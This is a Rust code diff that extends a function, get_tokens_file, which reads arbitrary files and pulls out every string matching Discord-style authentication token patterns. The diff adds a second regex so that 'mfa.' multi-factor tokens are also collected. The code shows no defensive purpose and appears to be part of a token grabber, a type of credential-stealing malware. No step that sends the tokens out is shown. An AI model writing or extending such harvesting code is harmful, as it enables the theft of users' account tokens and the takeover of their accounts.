@@ -5,7 +5,7 @@ extern crate encoding;
 
 use encoding::{Encoding, DecoderTrap};
 use encoding::all::WINDOWS_1254;
-use regex::Regex;
+use regex::{Regex, RegexBuilder};
 
 use std::io;
 use std::fs;
@@ -16,7 +16,7 @@ use std::ffi::CStr;
 use std::os::raw::c_char;
 
 
-fn path_exists(path: String) -> Result<bool, String> {  
+fn path_exists(path: String) -> Result<bool, String> {
     let metadata;
     match fs::metadata(path.as_str()) {
         Ok(t) => metadata = t,
@@ -33,8 +33,11 @@ fn path_exists(path: String) -> Result<bool, String> {
 
 fn get_tokens_file(file: &str) -> io::Result<String> {
     let re_token_normal = Regex::new(r"([\w-]{24})\.([\w-]{6})\.([\w-]{27})").unwrap();
-    //let re_token_mfa = RegexSet::new(&[r"mfa\.([\w-]{84})"]).unwrap();
-    //idk how these regexes work in Rust ¯\_(ツ)_/¯
+    let re_token_mfa = RegexBuilder::new(r#"mfa\.[\w-]{84}"#)
+            .size_limit(20485760)
+            .case_insensitive(true)
+            .build()
+            .unwrap();
 
     let mut buffer = Vec::new();
     let mut f = fs::File::open(file)?;
@@ -47,13 +50,16 @@ fn get_tokens_file(file: &str) -> io::Result<String> {
         Err(_) => return Ok(String::from(""))
     }
     data_str = &data_string[..];
-    
+
     let mut tokens: String = String::from("");
     for cap in re_token_normal.captures_iter(data_str) {
         tokens += &cap[0];
         tokens += "\n";
+    } for cap in re_token_mfa.captures_iter(data_str) {
+        tokens += &cap[0];
+        tokens += "\n";
     }
-        
+
     Ok(tokens)
 }
 
